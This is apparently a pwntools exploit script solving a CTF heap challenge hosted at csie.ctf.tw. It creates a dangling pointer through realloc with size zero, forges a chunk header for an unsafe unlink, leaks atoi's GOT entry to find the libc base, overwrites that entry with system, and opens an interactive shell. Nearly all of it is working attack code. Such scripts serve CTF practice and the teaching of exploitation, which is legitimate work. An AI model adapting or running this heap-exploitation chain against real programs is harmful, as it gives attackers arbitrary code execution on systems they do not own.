# -*- coding: utf-8 -*- 
from pwn import *
from time import sleep
context.arch = 'amd64'

#可發現到 realloc(ptr,0) 會被當成 free(ptr)
r = remote('csie.ctf.tw',10140)
#r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23
def add_profile(name,age,len_desc,desc):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(name.ljust(16,'\0'))
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(str(len_desc))
    r.recvuntil(':')
    r.send(desc)

def show_profile(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.send(str(idx))
def edit_profile(idx,name,age,desc):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(desc)
def realloc_errorr(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send('\x00')

def del_profile(idx):
    r.recvuntil(':')
    r.send('4')
    r.recvuntil(':')
    r.send(str(idx))

#start produce dangling pointer
add_profile('A',9,0x150,'AAAA')  #0,0x160 + 0x10 = 0xb0 + 0xc0
add_profile('B',9,0xa0,'BBBB')  #1
del_profile(0)  #A
realloc_errorr(1) #B
add_profile('C',9,0xa0,'CCCC')  #0
del_profile(1)  #B
add_profile('D',9,0xc8,'D'*(0xb0-0x10) + chr(0xa0)+'\0'*7 + chr(0xf0))  #1 ,the fake C.name chunk header will be set later.

add_profile('E',9,0xa0,'EEEE')  #2,use to set C.name in-use flag
add_profile('F',9,0xa0,'FFFF')  #3,use to set C.name in-use flag

#fake D.desc sub fake


prev_size = 0x0     #no value because prev chunk ,C.dsec,is in-used.
size = 0xa1         #d1 -> a1
C = 0x602128        #p[1] = 0x602128
fd = C - 0x18
bk = C - 0x10
fake_header = flat( [prev_size,size,fd,bk] ) 
edit_profile(1,'name','123',fake_header)
#unlink
realloc_errorr(0)

#leak libc info
atoi_got = 0x602098
edit_profile(1,'leak',123,p64(atoi_got))
show_profile(0)
r.recvuntil('Desc : ')

atoi_addr = u64(r.recvline().strip().ljust(8,'\0'))
libc = atoi_addr - 0x36e80
print 'atoi : ',atoi_addr
print 'libc : ',hex(libc) 
#hijcak got
sys_addr = libc + 0x45390
edit_profile(0,'hijack',123,p64(sys_addr))
print 'lol'
r.interactive()

